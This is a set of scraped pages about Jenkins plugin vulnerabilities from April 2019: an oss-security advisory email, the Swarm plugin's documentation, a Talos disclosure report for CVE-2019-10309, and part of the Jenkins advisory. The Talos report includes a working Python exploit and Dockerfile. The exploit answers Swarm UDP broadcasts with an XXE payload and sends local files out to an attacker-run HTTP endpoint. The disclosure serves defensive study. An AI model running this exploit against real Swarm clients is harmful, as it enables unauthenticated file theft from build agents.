=== Content from www.openwall.com_273443cd_20250120_234548.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](4) [[next>]](6) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-Id: <B9DB968B-E225-4245-85BE-6BB6CCD8791F@beckweb.net>
Date: Tue, 30 Apr 2019 14:17:30 +0200
From: Daniel Beck <ml@...kweb.net>
To: oss-security@...ts.openwall.com
Subject: Multiple vulnerabilities in Jenkins plugins

Jenkins is an open source automation server which enables developers around
the world to reliably build, test, and deploy their software. The following
releases contain fixes for security vulnerabilities:

* Ansible Tower Plugin 0.9.2
* Aqua MicroScanner Plugin 1.0.6
* Azure AD Plugin 0.3.4
* GitHub Authentication Plugin 0.32
* SiteMonitor Plugin 0.6
* Static Analysis Utilities Plugin 1.96

Additionally, these plugin have security vulnerabilities that have been made
public, but have no releases containing a fix yet:

* Koji Plugin
* Self-Organizing Swarm Plug-in Modules Plugin
* Twitter Plugin

Summaries of the vulnerabilities are below. More details, severity, and
attribution can be found here:
<https://jenkins.io/security/advisory/2019-04-30/>

We provide advance notification for security updates on this mailing list:
<https://groups.google.com/d/forum/jenkinsci-advisories>

If you discover security vulnerabilities in Jenkins, please report them as
described here:
<https://jenkins.io/security/#reporting-vulnerabilities>

---

SECURITY-1100 / CVE-2019-10307 (CSRF) and CVE-2019-10308 (permission check)
Static Analysis Utilities Plugin has the capability to allow other plugins to
display trend graphs for their static analysis results. Static Analysis
Utilities Plugin provides the configuration form for the default settings of
each graph.

The configuration form and form submission handler did not perform a
permission check, allowing attackers with Job/Read access to change the
per-job graph configuration defaults for all users.

Additionally, the form submission handler did not require POST requests,
resulting in a cross-site request forgery vulnerability.

Static Analysis Utilities Plugin now requires Job/Configure permission and
POST requests to configure the per-job graph defaults for all users.

SECURITY-930 / CVE-2019-10317
SiteMonitor Plugin unconditionally disables SSL/TLS certificate validation for
the entire Jenkins master JVM.

SiteMonitor Plugin no longer does that. Instead, it now has an opt-in option
to ignore SSL/TLS errors for each site check individually.

SECURITY-1252 / CVE-2019-10309
Self-Organizing Swarm Plug-in Modules Plugin allows clients to auto-discover
Jenkins instances on the same network through a UDP discovery request.
Responses to this request are XML documents.

Self-Organizing Swarm Plug-in Modules Plugin does not configure the XML parser
in a way that would prevent XML External Entity (XXE) processing. This allows
unauthenticated attackers on the same network to have Swarm clients parse a
maliciously crafted XML response that uses external entities to read arbitrary
files from the Swarm client or denial-of-service attacks.

As of publication of this advisory, there is no fix.

SECURITY-1355 (1) / CVE-2019-10310 (CSRF) and CVE-2019-10311 (permission check)
Ansible Tower Plugin did not perform permission checks on a method
implementing form validation. This allowed users with Overall/Read access to
Jenkins to connect to an attacker-specified URL using attacker-specified
credentials IDs obtained through another method, capturing credentials stored
in Jenkins.

Additionally, this form validation method did not require POST requests,
resulting in a cross-site request forgery vulnerability.

This form validation method now requires POST requests and Overall/Administer
permissions.

SECURITY-1355 (2) / CVE-2019-10312
Ansible Tower Plugin provides a list of applicable credential IDs to allow
users configuring the plugin to select the one to use.

This functionality did not check permissions, allowing any user with
Overall/Read permission to get a list of valid credentials IDs. Those could be
used as part of an attack to capture the credentials using another
vulnerability.

An enumeration of credentials IDs in this plugin now requires
Overall/Administer permission.

SECURITY-1390 / CVE-2019-10318
Azure AD Plugin stored the client secret unencrypted in the global config.xml
configuration file on the Jenkins master. These credentials could be viewed by
users with access to the master file system.

Azure AD Plugin now stores the client secret encrypted.

SECURITY-1143 / CVE-2019-10313
Twitter Plugin stores credentials unencrypted in its global configuration file
on the Jenkins master. These credentials could be viewed by users with access
to the master file system.

As of publication of this advisory, there is no fix.

SECURITY-936 / CVE-2019-10314
Koji Plugin unconditionally disables SSL/TLS certificate validation for the
entire Jenkins master JVM.

As of publication of this advisory, there is no fix.

SECURITY-443 / CVE-2019-10315
GitHub Authentication Plugin did not manage the state parameter of OAuth to
prevent CSRF. This allowed an attacker to catch the redirect URL provided
during the authentication process using OAuth and send it to the victim. If
the victim was already connected to Jenkins, their Jenkins account would be
attached to the attacker’s GitHub account.

The state parameter is now correctly managed.

SECURITY-1380 / CVE-2019-10316
Aqua MicroScanner Plugin stored credentials unencrypted in its global
configuration file on the Jenkins master. These credentials could be viewed by
users with access to the master file system.

Aqua MicroScanner Plugin now stores credentials encrypted.

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from plugins.jenkins.io_6e703a4c_20250121_015155.html ===

# Swarm

How to install

* [Documentation](/swarm/)
* [Releases](/swarm/releases/)
* [Issues](/swarm/issues/)
* [Dependencies](/swarm/dependencies/)
* [Health Score](/swarm/healthscore/)

[![Build Status](https://camo.githubusercontent.com/d20b65376fb2fcdb9877022b67b7570f8655344ff21bfc865ad861dcf2d13597/68747470733a2f2f63692e6a656e6b696e732e696f2f6a6f622f506c7567696e732f6a6f622f737761726d2d706c7567696e2f6a6f622f6d61737465722f62616467652f69636f6e)](https://ci.jenkins.io/job/Plugins/job/swarm-plugin/job/master/) [![Contributors](https://camo.githubusercontent.com/301d49cf2d12fc80d52b13a38e5393990e66d7d1e44fc653c3b3a967ed6e013a/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f636f6e7472696275746f72732f6a656e6b696e7363692f737761726d2d706c7567696e2e737667)](https://github.com/jenkinsci/swarm-plugin/graphs/contributors) [![Jenkins Plugin](https://camo.githubusercontent.com/91c991845db2cc6ec7bbe05f4d781acfa43bea77f62cac2c00d24a20c7ac347b/68747470733a2f2f696d672e736869656c64732e696f2f6a656e6b696e732f706c7567696e2f762f737761726d2e737667)](https://plugins.jenkins.io/swarm) [![GitHub release](https://camo.githubusercontent.com/6c4fe1ae5d3b1ba3013002f1addcd98a3b981ada90d09d6a3b67d509833bccd3/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f72656c656173652f6a656e6b696e7363692f737761726d2d706c7567696e2e7376673f6c6162656c3d6368616e67656c6f67)](https://github.com/jenkinsci/swarm-plugin/releases/latest) [![Jenkins Plugin Installs](https://camo.githubusercontent.com/654e36090def23ef73ce1926f5224036b21618868fe97fdb5fde4d4910575b54/68747470733a2f2f696d672e736869656c64732e696f2f6a656e6b696e732f706c7567696e2f692f737761726d2e7376673f636f6c6f723d626c7565)](https://plugins.jenkins.io/swarm)

* [Introduction](#plugin-content-introduction)
* [Getting started](#plugin-content-getting-started)
* [Documentation](#plugin-content-documentation)
* [Available options](#plugin-content-available-options)
* [Issues](#plugin-content-issues)
* [Contributing](#plugin-content-contributing)

## Introduction

The Swarm plugin enables nodes to join a nearby Jenkins controller, thereby forming an ad-hoc cluster. This plugin makes it easier to scale a Jenkins cluster by spinning up and tearing down new agents, enabling team members to contribute compute resources to a build farm or to attach agents to which the Jenkins controller cannot initiate connections.

This plugin consists of two pieces:

1. A self-contained client that can join an existing Jenkins controller.
2. A plugin that needs to be installed on the Jenkins controller to accept Swarm clients.

With the Swarm client, a person who is willing to contribute some of his computing power to the cluster just needs to run a virtual machine with the Swarm client and the cluster gets an additional agent. Because the Swarm client is running on a separate VM, there is no need to worry about the builds/tests interfering with the host system or altering its settings unexpectedly.

## Getting started

1. Install the Swarm plugin from the Update Center.
2. Ensure your agent is running version 11 or later of the Java Runtime Environment (JRE). The recommendation is to use the same JRE distribution and version as the controller.
3. Download the Swarm client from `${JENKINS_URL}/swarm/swarm-client.jar` on your agent.
4. Run the Swarm client with `java -jar path/to/swarm-client.jar -url ${JENKINS_URL} -username ${USERNAME}` and one of the authentication options as described in [the Global Security Configuration documentation](https://github.com/jenkinsci/swarm-plugin/blob/master/docs/security.adoc#authentication). There are no other required command-line options; run with the `-help` option to see the available options.

## Documentation

* [Changelog](https://github.com/jenkinsci/swarm-plugin/blob/master/CHANGELOG.adoc)
* [Logging and Diagnostics](https://github.com/jenkinsci/swarm-plugin/blob/master/docs/logging.adoc)
* [Prometheus Monitoring](https://github.com/jenkinsci/swarm-plugin/blob/master/docs/prometheus.adoc)
* [Proxy Configuration](https://github.com/jenkinsci/swarm-plugin/blob/master/docs/proxy.adoc)
* [Global Security Configuration](https://github.com/jenkinsci/swarm-plugin/blob/master/docs/security.adoc)
* [YAML Configuration](https://github.com/jenkinsci/swarm-plugin/blob/master/docs/configfile.adoc)

## Available options

`$ java -jar swarm-client.jar -help`

| Name | Description |
| --- | --- |
| `-config FILE` | YAML configuration file containing the options. |
| `-deleteExistingClients` | Delete any existing agent with the same name. (default: false) |
| `-description VAL` | Description to be put on the agent. |
| `-disableClientsUniqueId` | Disable client’s unique ID. (default: false) |
| `-disableSslVerification` | Disable SSL verification in the HTTP client. (default: false) |
| `-disableWorkDir` | Disable Remoting working directory support and run the agent in legacy mode. (default: false) |
| `-e (--env)` | An environment variable to be defined on this agent. It is specified as `key=value'. Multiple variables are allowed. |
| `-executors N` | Number of executors (default: number of CPUs) |
| `-failIfWorkDirIsMissing` | Fail if the requested Remoting working directory or internal directory is missing. (default: false) |
| `-fsroot FILE` | Remote root directory. (default: .) |
| `-help (--help, -h)` | Show the help screen (default: false) |
| `-internalDir FILE` | The name of the directory within the Remoting working directory where files internal to Remoting will be stored. |
| `-jar-cache FILE` | Cache directory that stores JAR files sent from the controller. |
| `-keepDisconnectedClients` | Do not remove clients from the controller when the agent becomes disconnected. (default: false) |
| `-labels VAL` | Whitespace-separated list of labels to be assigned for this agent. Multiple options are allowed. |
| `-labelsFile VAL` | File location with space delimited list of labels. If the file changes, the client is restarted. |
| `-maxRetryInterval N` | Max time to wait before retry in seconds. Default is 60 seconds. (default: 60) |
| `-mode MODE` | The mode controlling how Jenkins allocates jobs to agents. Can be either `normal' (use this node as much as possible) or `exclusive' (only build jobs with label expressions matching this node). Default is `normal'. (default: normal) |
| `-name VAL` | Name of the agent. |
| `-noRetryAfterConnected` | Do not retry if a successful connection gets closed. (default: false) |
| `-password VAL` | The Jenkins user API token or password. |
| `-passwordEnvVariable VAL` | Environment variable containing the Jenkins user API token or password. |
| `-passwordFile VAL` | File containing the Jenkins user API token or password. |
| `-pidFile VAL` | File to write PID to. The client will refuse to start if this file exists and the previous process is still running. |
| `-prometheusPort N` | If defined, then start an HTTP service on this port for Prometheus metrics. (default: -1) |
| `-retry N` | Number of retries before giving up. Unlimited if not specified. (default: -1) |
| `-retryBackOffStrategy RETRY_BACK_OFF_STRATEGY` | The mode controlling retry wait time. Can be either `none' (use same interval between retries) or `linear' (increase wait time before each retry up to maxRetryInterval) or `exponential' (double wait interval on each retry up to maxRetryInterval). Default is `none'. (default: NONE) |
| `-retryInterval N` | Time to wait before retry in seconds. Default is 10 seconds. (default: 10) |
| `-sslFingerprints VAL` | Whitespace-separated list of accepted certificate fingerprints (SHA-256/Hex), otherwise system truststore will be used. No revocation, expiration or not yet valid check will be performed for custom fingerprints! Multiple options are allowed. (default: ) |
| `-t (--toolLocation)` | A tool location to be defined on this agent. It is specified as `toolName=location'. |
| `-tunnel VAL` | Connect to the specified host and port, instead of connecting directly to Jenkins. Useful when connection to Jenkins needs to be tunneled. Can be also HOST: or :PORT, in which case the missing portion will be auto-configured like the default behavior |
| `-url (-master) VAL` | The complete target Jenkins URL like `http://server:8080/jenkins/'. |
| `-username VAL` | The Jenkins username for authentication. |
| `-webSocket` | Connect using the WebSocket protocol. (default: false) |
| `-webSocketHeader NAME=VALUE` | Additional WebSocket header to set, e.g. for authenticating with reverse proxies. To specify multiple headers, call this flag multiple times, one with each header. |
| `-workDir FILE` | The Remoting working directory where the JAR cache and logs will be stored. |

## Issues

Report issues and enhancements in the [Jenkins issue tracker](https://issues.jenkins.io/). Use the `swarm-plugin` component in the `JENKINS` project.

## Contributing

Refer to our [contribution guidelines](https://github.com/jenkinsci/.github/blob/master/CONTRIBUTING.md).

##### Version: 3.49

Released: 2 days agoRequires Jenkins 2.479.1ID: swarm
##### Installed on 2.47% of controllers

[View detailed version information](https://old.stats.jenkins.io/pluginversions/swarm.html)
##### Links

[GitHub](https://github.com/jenkinsci/swarm-plugin)[Open issues (Jira)](https://issues.jenkins.io/issues/?jql=resolution%20is%20EMPTY%20and%20component%3D15741)[Report an issue (Jira)](https://www.jenkins.io/participate/report-issue/redirect/#15741/swarm)[Javadoc](https://javadoc.jenkins.io/plugin/swarm)
##### Labels

[Agent Management](/ui/search/?labels=agent)
##### Maintainers

[Basil Crow](/ui/search/?query=basil)[Peter Jönsson](/ui/search/?query=mindjiver)[Oleg Nenashev](/ui/search/?query=oleg_nenashev)
##### Help us improve this page!

To propose a change submit a pull request to [the plugin page](https://github.com/jenkinsci/swarm-plugin) on GitHub.
##### Previous Security Warnings

* ###### [Swarm Plugin client bundles commons-httpclient library vulnerable to man-in-the-middle attacks](https://jenkins.io/security/advisory/2017-10-11/)

  + Affects some versions
* ###### [XXE vulnerability via UDP broadcast response in Swarm client](https://jenkins.io/security/advisory/2019-04-30/#SECURITY-1252)

  + Affects version 3.16 and earlier
* ###### [CSRF vulnerability and improper permission checks](https://jenkins.io/security/advisory/2020-06-03/#SECURITY-1200)

  + Affects version 3.20 and earlier
![tracker](https://jenkins-matomo.do.g4v.dev/piwik.php?idsite=1&rec=1&url=https://plugins.jenkins.io//swarm/)



=== Content from www.talosintelligence.com_50f2e610_20250120_234551.html ===


* [Cisco Login](/users/auth/saml)

* [Intelligence Center](/reputation)

  + [# Intelligence Center](/reputation)
  + BACK
  + [Intelligence Search](/reputation_center)
  + [Email & Spam Trends](/reputation_center/email_rep)
* [Vulnerability Research](/vulnerability_info)

  + [# Vulnerability Research](/vulnerability_info)
  + BACK
  + [Vulnerability Reports](/vulnerability_reports)
  + [Microsoft Advisories](/ms_advisories)
* [Incident Response](/incident_response)

  + [# Incident Response](/incident_response)
  + BACK
  + [Reactive Services](/incident_response/services#reactive-services)
  + [Proactive Services](/incident_response/services#proactive-services)
  + Emergency Support
* [Blog](https://blog.talosintelligence.com)
* [Support](https://support.talosintelligence.com)

More

* Security Resources

  # Security Resources

  + BACK
  Security Resources
  + [Open Source Security Tools](/software)
  + [Intelligence Categories Reference](/categories)
  + [Secure Endpoint Naming Reference](/secure-endpoint-naming)
* Media

  # Media

  + BACK
  Media
  + [Talos Intelligence Blog](https://blog.talosintelligence.com)
  + [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)
  + [Beers with Talos Podcast](/podcasts/shows/beers_with_talos)
  + [Talos Takes Podcast](/podcasts/shows/talos_takes)
  + [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)
* Company

  # Company

  + BACK
  Company
  + [About Talos](/about)
  + [Careers](/careers)

* Under Attack?
* [Cisco Login](/users/auth/saml)

## Contact Cisco Talos Incident Response

×

Close

This form is for Incident Response service inquiries only, including emergency network security needs.

For reputation or categorization inquiries, visit the [Talos Support site](/support).
For emergency DDoS mitigation assistance, please contact the [Cisco Secure DDoS Protection Team](https://www.cisco.com/c/en/us/products/collateral/security/ddos-emergency-attack-mitigation-aag.pdf).

Name

Company (optional)

Email address

Phone number

Preferred communication:

Email

Phone

What Incident Response Service are you interested in?
General Talos IR services and retainer information
Emergency Response
IR Plan
IR Playbooks
IR Readiness Assessment
Tabletop Exercises
Compromise Assessment
Threat Hunting
Cyber Range Training
Intelligence on Demand

Please provide as much detail as possible so we can best address your needs

I acknowledge that this is an inquiry for Incident Response services and that any other use of this form will not receive a response.

Send Email
Cancel

# Talos Vulnerability Report

### TALOS-2019-0783

## Jenkins Swarm Plugin XML external entities information disclosure vulnerability

##### May 6, 2019

##### CVE Number

CVE-2019-10309

### Summary

The Jenkins Self-Organizing Swarm Modules Plugin, version 3.14, contains a trivial XXE (XML External Entities) vulnerability inside of the `getCandidateFromDatagramResponses()` method. As a result of this issue, it is possible for an attacker on the same network as a Swarm client to read arbitrary files from the system by responding to the UDP discovery requests with a specially crafted response.

### Tested Versions

Swarm-Client - 3.14

### Product URLs

<https://github.com/jenkinsci/swarm-plugin>
[https://wiki.jenkins.io/display/JENKINS/Swarm+Plugin][https://wiki.jenkins.io/display/JENKINS/Swarm+Plugin]

### CVSSv3 Score

6.1 - CVSS:3.0/AV:A/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:L

### CWE

CWE-611 - Improper Restriction of XML External Entity Reference (‘XXE’)

### Details

This vulnerability could allow an unprivileged user connected to the network on which a set of Swarm agents are deployed to access data on the agent instances without additional authentication. Due to the nature of the UDP broadcast discovery mechanism, the ability of a user to run the proof-of-concept code in a network that uses this mechanism for Jenkins Master discovery yields unauthenticated local file read(s) on all agents seeking masters. This was tested in a Docker-based environment, where all agents running the Swarm Agent were able to be exploited simultaneously.

A CVSS v3 score of 6.1 has been calculated for this vulnerability. However, this is likely heavily dependent on the given deployment and could be significantly lower depending on a number of implementation factors. Furthermore, due to the nature of the Java XML parser, files that contain certain characters cannot be reflected in FTP or HTTP URIs to exfiltrate data.

### Exploit Proof of Concept

Dockerfile

```
FROM ubuntu:latest

# Update repository metadata and install a JVM.
RUN apt update && \
    apt install -y openjdk-8-jre-headless tcpdump curl && \
    apt install -y python3 python3-pip tmux && \
    pip3 install pyftpdlib

# Grab the latest Swarm Client.
RUN curl -D - -o /var/tmp/swarm-client.jar \
    https://repo.jenkins-ci.org/releases/org/jenkins-ci/plugins/swarm-client/3.14/swarm-client-3.14.jar

# Copy our exploit code to the container.
COPY exploit.py /root/exploit.py

# Give 'er.
ENTRYPOINT java -jar /var/tmp/swarm-client.jar

```

exploit.py

```
''' Jenkins Swarm-Plugin XXE PoC (via @Darkarnium). '''

import os
import sys
import socket
import uuid
import logging
import http.server
import socketserver
import multiprocessing

def find_ip():
    ''' Find the IP of the 'primary' network interface. '''
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect(('8.8.8.8', 80))
    addr = sock.getsockname()[0]
    sock.close()
    return addr

class RequestHandler(http.server.BaseHTTPRequestHandler):
    ''' Provides a set of request handlers for our Fake jenkins server. '''

    def __init__(self, request, client_address, server):
        ''' Bot on a logger. '''
        self.logger = logging.getLogger(__name__)
        super().__init__(request, client_address, server)

    def version_string(self):
        ''' Override version string / Server header. '''
        return 'TotallyJenkins'

    def log_message(self, fmt, *args):
        ''' Where we're going, we don't need logs. '''
        pass

    def log_error(self, fmt, *args):
        ''' Where we're going, we don't need logs. '''
        pass

    def log_request(self, code='-', size='-'):
        ''' Where we're going, we don't need logs. '''
        self.logger.debug(
            'Received %s request for %s from %s',
            self.command,
            self.path,
            self.client_address
        )

    def build_stage_two(self):
        ''' Builds a second stage XXE payload - for exfil. '''
        payload = '''
            <!ENTITY % local1 SYSTEM "file:///etc/debian_version">
            <!ENTITY % remote1 "<!ENTITY exfil1 SYSTEM 'http://{0}:{1}/exfil?/etc/debian_version=%local1;'>">
            <!ENTITY % local2 SYSTEM "file:///etc/hostname">
            <!ENTITY % remote2 "<!ENTITY exfil2 SYSTEM 'http://{0}:{1}/exfil?/etc/hostname=%local2;'>">
        '''.format(find_ip(), '8080')
        return payload.encode()

    def do_GET(self):
        ''' Implements routing for HTTP GET requests. '''
        self.logger.debug('Processing GET on route "%s"', self.path)

        # Provide an exfiltration endpoint.
        if '/exfil' in self.path:
            self.logger.warn('Exfiltrated %s -> "%s"', *self.path.split('?')[1].split('='))
            self.send_response(200, 'OK')
            self.send_header('X-Hudson', '1.395')
            self.send_header('Content-Length', '2')
            self.end_headers()
            self.wfile.write(b'OK')

        # Serve the payload DTD.
        if self.path.endswith('.dtd'):
            stage_two = self.build_stage_two()
            self.send_response(200, 'OK')
            self.send_header('Content-Type', 'application/x-java-jnlp-file')
            self.send_header('Content-Length', len(stage_two))
            self.end_headers()
            self.wfile.write(stage_two)

        # Ensure the X-Hudson check in Swarm plugin passes.
        if self.path == '/':
            self.send_response(200, 'OK')
            self.send_header('X-Hudson', '1.395')
            self.send_header('Content-Length', '2')
            self.end_headers()
            self.wfile.write(b'OK')

    def do_PUT(self):
        ''' Mock HTTP PUT requests. '''
        self.send_response(500)

    def do_POST(self):
        ''' Mock HTTP POST requests. '''
        self.logger.debug('Processing POST on route "%s"', self.path)

        # Respond with an OK to keep the exchange going.
        if self.path.startswith('/plugin/swarm/createSlave'):
            self.send_response(200, 'OK')
            self.send_header('Content-Length', '0')
            self.end_headers()

    def do_HEAD(self):
        ''' Mock HTTP HEAD requests. '''
        self.send_response(500)

    def do_PATCH(self):
        ''' Mock HTTP PATCH requests. '''
        self.send_response(500)

    def do_OPTIONS(self):
        ''' Mock HTTP HEAD requests. '''
        self.send_response(500)

class HTTPServer(multiprocessing.Process):
    ''' Provides a Fake Jenkins server to signal the Swarm. '''

    def __init__(self, port=8080):
        ''' Bolt on a logger. '''
        super().__init__()
        self.port = port
        self.logger = logging.getLogger(__name__)

    def run(self):
        ''' Do the thing. '''
        self.logger.info('Starting HTTP listener on TCP %s', self.port)

        # Kick off the server.
        instance = http.server.HTTPServer(
            ('0.0.0.0', self.port),
            RequestHandler
        )
        instance.serve_forever()

class Spwner(multiprocessing.Process):
    ''' Provides a Spawn broadcast listener and responder. '''

    def __init__(self, port=33848):
        ''' Setup a socket and bolt on a logger. '''
        super().__init__()
        self.port = port
        self.logger = logging.getLogger(__name__)
        self.logger.info('Binding broadcast listener to UDP %s', port)
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.bind(('255.255.255.255', self.port))
        self.swarm = str(uuid.uuid4())

    def build_swarm_xml(self):
        ''' Builds a baked Swarm payload. '''
        # This is dirty.
        payload = '''<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE swarm [
                <!ENTITY % stageTwo SYSTEM "http://{0}:{1}/stageTwo.dtd">
                %stageTwo;
                %remote1;
                %remote2;
            ]>
            <root>
                <swarm>&exfil1;</swarm>
                <version>&exfil2;</version>
                <url>http://{0}:{1}/</url>
            </root>
        '''.format(find_ip(), '8080')
        return payload.encode()

    def respond(self, client):
        ''' Send a payload to the given client. '''
        addr, port = client
        self.logger.info('Sending payload to %s:%s', addr, port)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(self.build_swarm_xml(), (addr, port))
        self.logger.info('Payload sent!')

    def listen(self):
        ''' Listen for clients. '''
        while True:
            _, client = self.sock.recvfrom(1024)
            self.logger.info('Received a Swarm broadcast from %s', client)
            self.respond(client)

    def run(self):
        ''' Do the thing. '''
        self.listen()

def main():
    ''' Jenkins Swarm-Plugin RCE PoC. '''
    # Configure the logger.
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(process)d - [%(levelname)s] %(message)s',
    )
    log = logging.getLogger(__name__)
    # log.setLevel(logging.DEBUG)

    # Spawn a fake Jenkins HTTP server.
    log.info('Spawning fake Jenkins HTTP Server')
    httpd = HTTPServer()
    httpd.start()

    # Spawn a broadcast listener.
    log.info('Spawning a Swarm broadcast listener')
    listener = Spwner()
    listener.start()

if __name__ == '__main__':
    main()

```
### Mitigation

Until such time that the vendor produces a patched version, the UDP broadcast functionality should be disabled. This can be performed by explicitly specifying a Jenkins master to connect to as part of the command-line arguments.

### Timeline

2018-12-05 - Vendor Disclosure

2019-04-30 - Vendor Patched

2019-05-06 - Public Release

##### Credit

Discovered by Peter Adkins of Cisco Umbrella.

---

[Vulnerability Reports](/vulnerability_reports) [Next Report

TALOS-2019-0772](/vulnerability_reports/TALOS-2019-0772) [Previous Report

TALOS-2019-0788](/vulnerability_reports/TALOS-2019-0788)

* + ###### [Intelligence Center](/reputation)
  + [Intelligence Search](/reputation_center)
  + [Email & Spam Trends](/reputation_center/email_rep)
* + ###### [Vulnerability Research](/vulnerability_info)
  + [Vulnerability Reports](/vulnerability_reports)
  + [Microsoft Advisories](/ms_advisories)
* + ###### [Incident Response](/incident_response)
  + [Reactive Services](/incident_response/services#reactive-services)
  + [Proactive Services](/incident_response/services#proactive-services)
  + Emergency Support
* + ###### Security Resources
  + [Open Source Security Tools](/software)
  + [Intelligence Categories Reference](/categories)
  + [Secure Endpoint Naming Reference](/secure-endpoint-naming)
* + ###### Media
  + [Talos Intelligence Blog](https://blog.talosintelligence.com)
  + [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)
  + [Beers with Talos Podcast](/podcasts/shows/beers_with_talos)
  + [Talos Takes Podcast](/podcasts/shows/talos_takes)
  + [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)
* + ###### Support
  + [Support Documentation](https://support.talosintelligence.com)
* + ###### Company
  + [About Talos](/about)
  + [Careers](/careers)
  + [Cisco Security](https://www.cisco.com/c/en/us/products/security/product-listing.html)

###### Follow us

[![Cisco](/assets/logo_cisco_white-d87b7f7d3152ad412e48aad924a972cc5b802b7a53cb56b0792a4456c9b7b3a5.svg)](http://tools.cisco.com/security/center/home.x)

©
2025
Cisco Systems, Inc. and/or its affiliates. All rights
reserved. View our
[Privacy Policy.](http://www.cisco.com/web/siteassets/legal/privacy_full.html)



=== Content from jenkins.io_ebf34f31_20250120_234550.html ===


[Jenkins Security Home](/security/)

**For Administrators**

* [Overview](/security/for-administrators/)
* [Security Advisories](/security/advisories/)
* [Security Issues](/security/issues/)
* [Advisory Schedule](/security/scheduling/)
* [Vulnerabilities in Plugins](/security/plugins/)
* [How We Fix Security Issues](/security/fixing/)

**For Reporters**

* [Reporting Vulnerabilities](/security/reporting/)
* [Jenkins CNA](/security/cna/)

**For Maintainers**

* [Overview](/security/for-maintainers/)
* [Vulnerabilities in Plugins](/security/plugins/)

**Jenkins Security Team**

* [About](/security/team/)
* [Contributions](/security/improvements/)

# Jenkins Security Advisory 2019-04-30

This advisory announces vulnerabilities in the following Jenkins deliverables:

* analysis-core
  Plugin
* [Ansible Tower
  Plugin](https://plugins.jenkins.io/ansible-tower)
* [Aqua MicroScanner
  Plugin](https://plugins.jenkins.io/aqua-microscanner)
* [GitHub Authentication
  Plugin](https://plugins.jenkins.io/github-oauth)
* [Koji
  Plugin](https://plugins.jenkins.io/koji)
* [Microsoft Entra ID (previously Azure AD)
  Plugin](https://plugins.jenkins.io/azure-ad)
* [SiteMonitor
  Plugin](https://plugins.jenkins.io/sitemonitor)
* [Swarm
  Plugin](https://plugins.jenkins.io/swarm)
* [Twitter
  Plugin](https://plugins.jenkins.io/twitter)

## Descriptions

### CSRF vulnerability and missing permission check allowed changing default graph configuration in analysis-core Plugin

**SECURITY-1100
/
CVE-2019-10307 (CSRF) and CVE-2019-10308 (permission check)**

**Severity (CVSS):**
[Medium](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N)

**Affected plugin:
[`analysis-core`](https://plugins.jenkins.io/analysis-core)**

**Description:**

analysis-core Plugin has the capability to allow other plugins to display trend graphs for their static analysis results.
analysis-core Plugin provides the configuration form for the default settings of each graph.

The configuration form and form submission handler did not perform a permission check, allowing attackers with Job/Read access to change the per-job graph configuration defaults for all users.

Additionally, the form submission handler did not require POST requests, resulting in a cross-site request forgery vulnerability.

analysis-core Plugin now requires Job/Configure permission and POST requests to configure the per-job graph defaults for all users.

### SiteMonitor Plugin globally and unconditionally disables SSL/TLS certificate validation

**SECURITY-930
/
CVE-2019-10317**

**Severity (CVSS):**
[Medium](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N)

**Affected plugin:
[`sitemonitor`](https://plugins.jenkins.io/sitemonitor)**

**Description:**

SiteMonitor Plugin unconditionally disables SSL/TLS certificate validation for the entire Jenkins controller JVM.

SiteMonitor Plugin no longer does that.
Instead, it now has an opt-in option to ignore SSL/TLS errors for each site check individually.

### XXE vulnerability via UDP broadcast response in Swarm Plugin client

**SECURITY-1252
/
CVE-2019-10309**

**Severity (CVSS):**
